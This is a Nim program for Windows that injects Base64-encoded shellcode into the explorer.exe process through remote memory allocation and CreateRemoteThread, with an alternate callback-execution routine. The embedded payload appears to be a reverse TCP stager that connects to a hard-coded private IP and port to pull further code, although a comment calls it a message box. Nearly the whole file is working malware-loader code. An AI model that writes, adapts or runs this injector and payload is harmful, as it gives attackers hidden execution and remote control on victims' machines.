import winim/lean, base64, osproc, winim/inc/psapi, unicode, strutils
import winim/inc/tlhelp32


proc getExplorerPID(): DWORD =
  var 
    processEntry: PROCESSENTRY32W
    hSnapshot: HANDLE
    found = false
  
  # Initialize size of PROCESSENTRY32W
  processEntry.dwSize = sizeof(PROCESSENTRY32W).DWORD
  
  # Create snapshot of current processes
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if hSnapshot == INVALID_HANDLE_VALUE:
    return 0

  # Get first process
  if Process32FirstW(hSnapshot, processEntry):
    # Print first process
    var procName = cast[WideCString](addr processEntry.szExeFile[0])
    echo "Process: ", $procName
    if ($procName).toLowerAscii() == "explorer.exe":
      result = processEntry.th32ProcessID
      found = true
    
    # Iterate through remaining processes
    while Process32NextW(hSnapshot, processEntry):
      procName = cast[WideCString](addr processEntry.szExeFile[0])
      echo "Process: ", $procName
      if ($procName).toLowerAscii() == "explorer.exe":
        result = processEntry.th32ProcessID
        found = true
        break
  
  # Clean up
  CloseHandle(hSnapshot)
  
  if not found:
    return 0

proc injectShellcode(shellcode: openarray[byte]): void =
    echo ".oO finding PID Oo."
    let targetPID = getExplorerPID()
    if targetPID == 0:
        echo "Could not find explorer.exe process."
        return

    # Open process with specific access rights
    let hProcess = OpenProcess(
        PROCESS_VM_OPERATION or PROCESS_VM_WRITE or PROCESS_VM_READ or PROCESS_CREATE_THREAD,
        false,
        targetPID
    )
    
    if hProcess == INVALID_HANDLE_VALUE or hProcess == HANDLE(0):
        echo "Failed to open target process. Error: ", GetLastError()
        return

    # Allocate memory with proper size alignment
    let size = cast[SIZE_T]((shellcode.len + 0xFFF) and not 0xFFF)  # Round up to nearest page
    let memAddress = VirtualAllocEx(
        hProcess,
        nil,
        size,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )

    if memAddress == nil:
        echo "Failed to allocate memory in target process. Error: ", GetLastError()
        CloseHandle(hProcess)
        return

    # Write shellcode into allocated memory
    echo ".oO injecting the code Oo."
    var bytesWritten: SIZE_T
    let writeResult = WriteProcessMemory(
        hProcess,
        memAddress,
        unsafeAddr shellcode[0],
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    if writeResult == 0:
        echo "Failed to write shellcode into target process. Error: ", GetLastError()
        VirtualFreeEx(hProcess, memAddress, size, MEM_RELEASE)
        CloseHandle(hProcess)
        return

    echo "Wrote ", bytesWritten, " bytes of ", shellcode.len, " total bytes"

    # Create a remote thread in the target process to execute the shellcode
    echo ".oO executing the code Oo."
    var threadId: DWORD
    let hThread = CreateRemoteThread(
        hProcess, 
        nil, 
        0, 
        cast[LPTHREAD_START_ROUTINE](memAddress), 
        nil, 
        0, 
        addr threadId
    )

    if hThread == HANDLE(0):
        echo "Failed to create remote thread. Error: ", GetLastError()
    else:
        echo "Shellcode injected successfully! Thread ID: ", threadId
        let waitResult = WaitForSingleObject(hThread, 30000)  # Wait up to 30 seconds
        case waitResult
        of WAIT_OBJECT_0:
            echo "Thread completed successfully"
        of WAIT_TIMEOUT:
            echo "Thread execution timed out"
        else:
            echo "Wait failed with error: ", GetLastError()

    # Clean up
    if hThread != HANDLE(0):
        CloseHandle(hThread)
    VirtualFreeEx(hProcess, memAddress, size, MEM_RELEASE)
    CloseHandle(hProcess)
        

proc executeShellcode(shellcode: openarray[byte]): void = 

    
    echo ".oO Executing the code Oo."

    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )
 # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))

    # Callback execution
    EnumSystemGeoID(
        16,
        0,
        cast[GEO_ENUMPROC](rPtr)
    ) 

let base64Str = """/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBRVkiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHB
yQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCCLSBhQSQHQ
41ZI/8lBizSITTHJSAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0Ac
SQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJ
ieZIgeygAQAASYnlSbwCAB+QwKiOgEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoK
QV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/
znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhI
ifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoA
WkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V
"""  

let decodedData = decode(base64Str)
echo "decoded:", decodedData
echo decodedData.len
var buf: array[1642, byte] # is it 316
copyMem(unsafeAddr(buf[0]), unsafeAddr(decodedData[0]), decodedData.len)
echo buf.len
# pop msgbox
injectShellcode(buf)
#executeShellcode(buf)
echo "Success!"
